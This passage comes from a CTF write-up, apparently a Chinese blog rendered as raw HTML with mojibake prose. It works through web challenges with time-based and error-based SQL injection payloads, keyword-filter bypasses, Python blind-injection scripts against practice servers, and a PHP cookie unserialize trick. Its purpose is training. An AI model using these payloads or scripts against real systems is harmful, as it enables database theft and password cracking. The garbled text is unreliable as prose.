è¯­å¥<span class="hljs-number">1</span> <span class="hljs-keyword">then</span> è¯­å¥<span class="hljs-number">2</span> <span class="hljs-keyword">else</span> è¯­å¥<span class="hljs-number">3</span> <span class="hljs-keyword">end</span>;//å«ä¹‰å¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯å½“è¯­å¥<span class="hljs-number">1</span>ä¸ºçœŸæ—¶ï¼Œæ‰§è¡Œè¯­å¥<span class="hljs-number">2</span>ï¼Œå¦åˆ™æ‰§è¡Œè¯­å¥<span class="hljs-number">3</span></code></pre><p>æ‰€ä»¥è¦æ„é€ çš„æ³¨å…¥è¯­å¥ä¸º</p><pre><code class="hljs n1ql">11&#x27;+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-built_in">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>//å½“æ•°æ®åº“åçš„é•¿åº¦ä¸º<span class="hljs-number">5</span>æ—¶ï¼Œåˆ™æ‰§è¡Œsleep(<span class="hljs-number">5</span>)ï¼Œå¦åˆ™ç»“æŸï¼Œè¿™æ ·å°±å¯ä»¥æ ¹æ®ç½‘é¡µçš„å“åº”æ—¶é—´æ¥åˆ¤æ–­æŸ¥è¯¢è¯­å¥æ˜¯å¦æ­£ç¡®</code></pre><p>å¸¦å…¥åŸè¯­å¥</p><pre><code class="hljs n1ql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;$ip&#x27;</span>)<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;11&#x27;</span>+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-built_in">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>//å¯ä»¥çœ‹åˆ°è¯­å¥æˆåŠŸæ³¨å…¥åˆ°åŸæŸ¥è¯¢è¯­å¥ä¸­ï¼Œå¹¶å¯ä»¥æ­£å¸¸æ‰§è¡Œ</code></pre><p>åˆ¤æ–­å­—æ®µæ¯ä¸€ä¸ªå­—ç¬¦çš„å€¼</p><p>å¸¸ç”¨çš„è¯­å¥åº”è¯¥ä¸º</p><pre><code class="hljs ada"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (substr(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;c&#x27;</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) #</code></pre><p>ä½†æ˜¯å› ä¸ºé€—å·è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æ”¹ä¸ºä¸‹é¢çš„è¯­å¥</p><pre><code class="hljs ada"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (substr(<span class="hljs-keyword">select</span> database()) from <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;c&#x27;</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) #</code></pre><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> sys<span class="hljs-comment">#sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+</span><span class="hljs-comment">##client_ip,flag</span><span class="hljs-comment">#sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+</span>sql = <span class="hljs-string">&quot;127.0.0.1&#x27;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27; then sleep(5) else 0 end))-- +&quot;</span>url = <span class="hljs-string">&#x27;http://123.206.87.240:8002/web15/&#x27;</span>flag = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):    print(<span class="hljs-built_in">str</span>(i))    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">129</span>):        <span class="hljs-keyword">if</span> ch == <span class="hljs-number">128</span>:            sys.exit(<span class="hljs-number">0</span>)        sqli = sql.<span class="hljs-built_in">format</span>(i, <span class="hljs-built_in">chr</span>(ch))        header = &#123;            <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: sqli        &#125;        <span class="hljs-keyword">try</span>:            html = requests.get(url, headers=header, timeout=<span class="hljs-number">3</span>) <span class="hljs-comment">#å“åº”æ—¶é—´è¶…è¿‡3ç§’åˆ™ è¿›å…¥except å³å¯çŒœæµ‹æ˜¯æ­£ç¡®çš„</span>        <span class="hljs-keyword">except</span>:            flag += <span class="hljs-built_in">chr</span>(ch)            print(flag)            <span class="hljs-keyword">break</span></code></pre><h2 id="è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†"><a href="#è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†" class="headerlink" title="è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†"></a>è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†</h2><p>ç½‘å€æ‰“ä¸å¼€</p><h2 id="å¤šæ¬¡"><a href="#å¤šæ¬¡" class="headerlink" title="å¤šæ¬¡"></a>å¤šæ¬¡</h2><p>tips</p><blockquote><p>æœ¬é¢˜æœ‰2ä¸ªflag<br>flagå‡ä¸ºå°å†™<br>flagæ ¼å¼ flag{}</p></blockquote><p>çœ‹åˆ°é¢˜ç›®æç¤ºï¼Œåº”è¯¥æ˜¯äºŒæ¬¡æ³¨å…¥</p><p>urlä¸­å­˜åœ¨idå‚æ•°ï¼Œå†idå‚æ•°ååŠ  â€˜åé¡µé¢æŠ¥é”™ï¼Œå†åŠ ä¸Š#åæ˜¾ç¤º <code>There is nothing</code></p><p>è¾“å…¥ id=1â€™or 1=1â€“+ æŠ¥é”™</p><p>ä½†æ˜¯è¾“å…¥id=1â€™oorr 1=1â€“+ æ—¶æ­£å¸¸äº†ï¼Œè¯´æ˜å­˜åœ¨å…³é”®è¯è¿‡æ»¤ï¼Œé€šè¿‡å¼‚æˆ–æ³¨å…¥å‘ç°è¿‡æ»¤äº†union,select,and,orç­‰å…³é”®è¯ï¼Œå¯ä»¥ç”¨åŒå†™ç»•è¿‡ã€‚</p><pre><code class="hljs matlab"><span class="hljs-number">1</span>&#x27;^(<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)!=<span class="hljs-number">0</span>)--+é¡µé¢æ˜¾ç¤ºé”™è¯¯æ­£å¸¸è¯´æ˜<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)!=<span class="hljs-number">0</span>æ˜¯é”™çš„ï¼Œå³<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)=<span class="hljs-number">0</span>ï¼Œè¯´æ˜unionæ›¿æ¢ä¸ºç©ºäº†å…¶ä»–å…³é”®è¯çš„æµ‹è¯•ä¹Ÿç±»ä¼¼</code></pre><p>å¼€å§‹æ³¨å…¥</p><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span><span class="hljs-string"></span><span class="hljs-string">database:flag1,hint</span><span class="hljs-string"></span><span class="hljs-string">-1&#x27;</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> infoorrmation_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag1&#x27;</span><span class="hljs-comment">--+</span><span class="hljs-keyword">table</span>:flag1,address<span class="hljs-number">-1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</span><span class="hljs-string">usOwycTju+FTUUzXosjr è§£ç ä¸ºï¼šå¥½å§ä½ ä¼šSQLæ³¨å…¥</span><span class="hljs-string">-1&#x27;</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(address) <span class="hljs-keyword">from</span> flag1 <span class="hljs-comment">--+</span>æ‹¿åˆ°ä¸‹ä¸€å…³çš„åœ°å€</code></pre><p><img src="https://i.loli.net/2020/11/23/uMT6Q7oaNHJEcbv.png" alt="sqls-1.png"></p><p>åŒæ ·å­˜åœ¨ä¸€ä¸ªæ³¨å…¥ç‚¹idï¼ŒåŠ å•å¼•å·å‘ç°æç¤ºäº†æŠ¥é”™ä¿¡æ¯ï¼Œå¾ˆæ˜æ˜¾æ˜¯æŠ¥é”™æ³¨å…¥</p><p><img src="https://i.loli.net/2020/11/23/KBepFMZsYRPHaW8.png" alt="sqls-2.png"></p><p>æŠ¥é”™æ³¨å…¥ä¸€èˆ¬æ˜¯å›ºå®šçš„æ¨¡æ¿</p><p>ä¸‹é¢ä½¿ç”¨updatexml()è¿›è¡Œæ³¨å…¥</p><blockquote><p>å‡½æ•°è¯­æ³•ï¼šupdatexml(XML_document, XPath_string, new_value);</p><p>é€‚ç”¨ç‰ˆæœ¬: 5.1.5+<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®<br>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p><p>æˆ‘ä»¬é€šå¸¸åœ¨ç¬¬äºŒä¸ªxpathå‚æ•°å¡«å†™æˆ‘ä»¬è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</p></blockquote><p>payload</p><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span>~<span class="hljs-string">&#x27;),3) %23</span><span class="hljs-string">database:~class,flag2~</span><span class="hljs-string"> </span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag2&#x27;</span>),<span class="hljs-string">&#x27;~&#x27;</span>),<span class="hljs-number">3</span>) %<span class="hljs-number">23</span><span class="hljs-keyword">table</span>:~flag2,address~# æŸ¥æ•°æ®?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span><span class="hljs-number">0x7e</span><span class="hljs-string">&#x27;,(select flag2 from flag2),&#x27;</span><span class="hljs-number">0x7e</span><span class="hljs-string">&#x27;),3) %23</span><span class="hljs-string"> æ‹¿åˆ°çœŸæ­£çš„flag</span></code></pre><p><img src="https://i.loli.net/2020/11/23/QwtPgsAriuMOGLB.png" alt="sqls-flag.png"></p><h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>é¢˜ç›®ç»™äº†æºç åˆ†æå¯çŸ¥æ˜¯ä¸€ä¸ªåŠ å¯†è¿‡ç¨‹ï¼Œå¹¶ä¸”ç»™äº†åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å†™å‡ºè§£å¯†è„šæœ¬å³å¯</p><p>åŠ å¯†åçš„æ•°æ®ä¸º</p><pre><code class="hljs abnf"><span class="hljs-attribute">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA</span>=</code></pre><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$key</span> = md5(<span class="hljs-string">&#x27;ISCC&#x27;</span>);    <span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;    <span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$data</span>);    <span class="hljs-variable">$klen</span> = strlen(<span class="hljs-variable">$key</span>);    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123;         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$x</span> == <span class="hljs-variable">$klen</span>)        &#123;            <span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-variable">$char</span> .= <span class="hljs-variable">$key</span>[<span class="hljs-variable">$x</span>];        <span class="hljs-variable">$x</span>+=<span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123;        <span class="hljs-variable">$str</span> .= chr((ord(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]) + ord(<span class="hljs-variable">$char</span>[<span class="hljs-variable">$i</span>])) % <span class="hljs-number">128</span>);    &#125;    <span class="hljs-keyword">return</span> base64_encode(<span class="hljs-variable">$str</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>è§£å¯†è„šæœ¬å¦‚ä¸‹</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$key</span> = md5(<span class="hljs-string">&#x27;ISCC&#x27;</span>);  <span class="hljs-comment">// å¯¹å¯†é’¥è¿›è¡Œmd5åŠ å¯†</span>    <span class="hljs-variable">$x</span>=<span class="hljs-number">0</span>;    <span class="hljs-variable">$str</span>=base64_decode(<span class="hljs-variable">$str</span>); <span class="hljs-comment">//å¯¹åŠ å¯†åçš„å­—ç¬¦ä¸²base64è§£ç </span>    <span class="hljs-variable">$len</span>=strlen(<span class="hljs-variable">$str</span>);         <span class="hljs-variable">$klen</span>=strlen(<span class="hljs-variable">$key</span>);    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)   <span class="hljs-comment">//è®¡ç®—å‡ºcharå­—ç¬¦æ•°ç»„ï¼Œç”¨äºæœ€åçš„å‡æ“ä½œ</span>    &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>==<span class="hljs-variable">$klen</span>)        &#123;            <span class="hljs-variable">$x</span>=<span class="hljs-number">0</span>;        &#125;        <span class="hljs-variable">$char</span>.=<span class="hljs-variable">$key</span>[<span class="hljs-variable">$x</span>];        <span class="hljs-variable">$x</span>+=<span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)    &#123;        <span class="hljs-variable">$data</span>.=chr((ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>])-ord(<span class="hljs-variable">$char</span>[<span class="hljs-variable">$i</span>])+<span class="hljs-number">128</span>)%<span class="hljs-number">128</span>);  <span class="hljs-comment">//åŠ ä¸Š128ä¸ºäº†é˜²æ­¢å‡ºç°è´Ÿæ•°ã€‚</span>    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;&#125;<span class="hljs-keyword">echo</span>(decode(<span class="hljs-string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>));<span class="hljs-meta">?&gt;</span></code></pre><p><img src="https://i.loli.net/2020/11/23/DEs3N8y7ngdKovb.png" alt="encode.png"></p><h2 id="æ–‡ä»¶åŒ…å«2"><a href="#æ–‡ä»¶åŒ…å«2" class="headerlink" title="æ–‡ä»¶åŒ…å«2"></a>æ–‡ä»¶åŒ…å«2</h2><p>ç½‘å€æ‰“ä¸å¼€</p><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>ç»™äº†æç¤ºhintï¼ŒçŒœæµ‹å¯èƒ½æ˜¯è¦æäº¤çš„å‚æ•°ï¼Œgetæäº¤hint,æ˜¾ç¤ºæºç </p><pre><code class="hljs php+HTML">&lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];  &#x2F;&#x2F;å«cookie å¯èƒ½éœ€è¦æŠ“åŒ…ä¿®æ”¹cookieif(isset($_GET[&#39;hint&#39;]))&#123;    show_source(__FILE__);&#125;elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;) &#x2F;&#x2F;å¦‚æœååºåˆ—åŒ–åçš„$cookie&#x3D;&#x3D;&#x3D;$KEY æ‹¿åˆ°flag&#123;                                               echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;&lt;title&gt;Login&lt;&#x2F;title&gt;&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;br&gt;&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;  &lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php&#125;$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;?&gt;</code></pre><p>ä»£ç å®¡è®¡å®Œåæ€è·¯å¾ˆç®€å•å°±æ˜¯cookieæ³¨å…¥ï¼Œè€Œä¸”$KEYçš„å€¼ä¸‹é¢ä¹Ÿå·²ç»ç»™äº†</p><p>ç›´æ¥æ„é€ </p><pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;ISecer:www.isecer.com&quot;</span><span class="hljs-comment">;</span></code></pre><p>ä½†æ˜¯ä¼šå‘ç°å¹¶æ²¡æœ‰æ˜¾ç¤ºflagï¼Œè¿™æ˜¯å› ä¸ºè¿™é¢˜ç»™å‡ºçš„$KEYæ˜¯è¿·æƒ‘äººçš„ï¼Œä¸‹é¢è¿™æ®µphpä»£ç ä¸ä¸Šé¢æ²¡å…³ç³»ï¼Œå°±æ˜¯è¯´æ˜ä¸Šé¢ä»£ç ä¸­$KEYä¸ºNULL</p><p>æ‰€ä»¥çœŸæ­£çš„payloadï¼š</p><pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">;</span></code></pre><p>è¯·æ±‚å¤´</p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flagphp/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">123.206.87.240:8002</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; WOW<span class="hljs-number">64</span>; rv:<span class="hljs-number">46</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">46</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span><span class="hljs-attribute">Cookie</span>: ISecer=s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-attribute">Connection</span>: close</code></pre><h2 id="sqlæ³¨å…¥2"><a href="#sqlæ³¨å…¥2" class="headerlink" title="sqlæ³¨å…¥2"></a>sqlæ³¨å…¥2</h2><p>æç¤ºï¼š</p><blockquote><p>å…¨éƒ½tmè¿‡æ»¤äº†ç»æœ›å—ï¼Ÿ</p><p>æç¤º !,!=,=,+,-,^,%</p></blockquote><p>å¸¦æœ‰è¿‡æ»¤çš„sqlæ³¨å…¥</p><p>å…ˆæµ‹è¯•ä¸€ä¸‹è¿‡æ»¤å“ªäº›å­—ç¬¦</p><p><img src="https://i.loli.net/2020/11/25/zAG3jeME7Ocs2Wt.png" alt="sql2-2.png"></p><p>æµ‹è¯•å‘ç°  or ï¼Œand,#,â€“+,union,from ,database(),è¿™äº›å¸¸ç”¨å­—ç¬¦éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ²¡æœ‰è¿‡æ»¤çš„å­—ç¬¦åªæœ‰æç¤ºä¸­çš„å­—ç¬¦</p><p>æµ‹è¯•è¿˜å¯ä»¥å‘ç°ï¼Œå½“uname=admin&amp;passwd=111æ—¶æç¤ºçš„password error ,</p><p>ä½†æ˜¯å½“uname=adm&amp;passwd=111æ—¶æç¤ºusername errorï¼Œè¿™ä¹Ÿæ˜¯ç›²æ³¨çš„ä¸€ç§äº†ã€‚</p><p>å½“uname=adminâ€™-1-â€˜&amp;passwd=11æ—¶ä¸ºfalse</p><p>å½“uname=adminâ€™-0-â€˜&amp;passwd=1æ—¶ä¸ºtrue</p><p>æ‰€ä»¥çŒœæµ‹sqlæŸ¥è¯¢è¯­å¥ä¸º</p><pre><code class="hljs mysql">$sql &#x3D; select * from users where username&#x3D;$username;</code></pre><h3 id="å°è¯•æ„é€ æ³¨å…¥è¯­å¥"><a href="#å°è¯•æ„é€ æ³¨å…¥è¯­å¥" class="headerlink" title="å°è¯•æ„é€ æ³¨å…¥è¯­å¥"></a>å°è¯•æ„é€ æ³¨å…¥è¯­å¥</h3><pre><code class="hljs lisp">ascii(<span class="hljs-name">substr</span>((<span class="hljs-name">select</span> database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;50</code></pre><p>ä¸Šåçš„è¯­å¥å¯ä»¥æ”¾åˆ°adminâ€™-1â€™&amp;passwd=11ä¸­ 1çš„ä½ç½®</p><p>ä½†æ˜¯è¿˜æ˜¯å­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼Œå› ä¸ºé¢˜ç›®è¿‡æ»¤äº†ç©ºæ ¼ï¼Œé€—å·ï¼Œå¤šæ¬¡ä¿®æ”¹åå‹¾å‡ºä¸‹é¢çš„è¯­å¥</p><pre><code class="hljs mysql">ascii(mid(REVERSE(MID((passwd)from(-1)))from(-1)))&gt;0</code></pre><p>reverse ä¸ºå­—ç¬¦ä¸²åè½¬å‡½æ•°</p><p><img src="https://i.loli.net/2020/11/25/fAOErbn2JSWxgPM.png" alt="sql2-1.png"></p><p>ç¡®å®šç›²æ³¨çš„åˆ¤æ–­æ¡ä»¶</p><p>å½“ä¸Šé¢çš„è¯­å¥æˆç«‹æ—¶è¿”å›çš„æ˜¯ username error </p><p><img src="https://i.loli.net/2020/11/25/7NWBSIEGUTqiMKt.png" alt="sql2-4.png"></p><p>ä¸æˆç«‹æ—¶è¿”å›çš„æ˜¯password  error  </p><p><img src="https://i.loli.net/2020/11/25/5wdsrDZSipRENB3.png" alt="sql-3.png"></p><p>ç¼–å†™è„šæœ¬</p><p>å› ä¸ºå¯†ç ä¿å­˜æ—¶ä¸€èˆ¬æ˜¯ä»¥ md5å½¢å¼ä¿å­˜ï¼Œæ‰€ä»¥çˆ†ç ´å¯†ç çš„é•¿åº¦åº”è¯¥ä¸º32ä½</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://123.206.87.240:8007/web2/login.php&quot;</span>cookie =&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:<span class="hljs-string">&#x27;r3rln64ialiqjnefpa6qu5a0t513t8rs&#x27;</span>&#125;password = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>:        payload = <span class="hljs-string">&quot;admin&#x27;-(ascii(mid(REVERSE(MID((passwd)from(-&#123;0&#125;)))from(-1)))=&#123;1&#125;)-&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(j))        data=&#123;<span class="hljs-string">&#x27;uname&#x27;</span>:payload,<span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&quot;111&quot;</span>&#125;        res = requests.post(url=url,cookies=cookie,data=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">in</span> res.text:            password +=j            <span class="hljs-comment">#print(password)</span>            <span class="hljs-keyword">break</span>print(password)</code></pre><p><img src="https://i.loli.net/2020/11/25/uhOXQkE5VNt623H.png" alt="sql2-5.png"></p><pre><code class="hljs apache"><span class="hljs-attribute">005b81fd960f61505237dbb7a3202910</span><span class="hljs-attribute">md5</span>åœ¨çº¿è§£ç åä¸ºadmin<span class="hljs-number">123</span></code></pre><p>ç™»å½•åå³å¯ç”¨lså‘½ä»¤ï¼Œå°±å¯ä»¥æ‹¿åˆ°flag</p><p>è¿™é¢˜ä½¿ç”¨çš„æ˜¯å¼±å¯†ç ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨bpçš„çˆ†ç ´æ¨¡å—è¿›è¡Œå¯†ç çˆ†ç ´</p><p>å‚è€ƒå¶å¸ˆå‚…ï¼š<a href="https://xz.aliyun.com/t/2583">https://xz.aliyun.com/t/2583</a></p><h2 id="å­™xxçš„åšå®¢"><a href="#å­™xxçš„åšå®¢" class="headerlink" title="å­™xxçš„åšå®¢"></a>å­™xxçš„åšå®¢</h2><p>è¿›å…¥é¡µé¢æ˜¯ä¸€ä¸ªåšå®¢çš„é¡µé¢ï¼Œæœ‰æœç´¢åŠŸèƒ½ï¼Œæ²¡æœ‰æ€è·¯</p><p>äºæ˜¯æ‰«æç›®å½•</p><p><img src="https://i.loli.net/2020/11/25/eMWjLmnHahPJXk9.png" 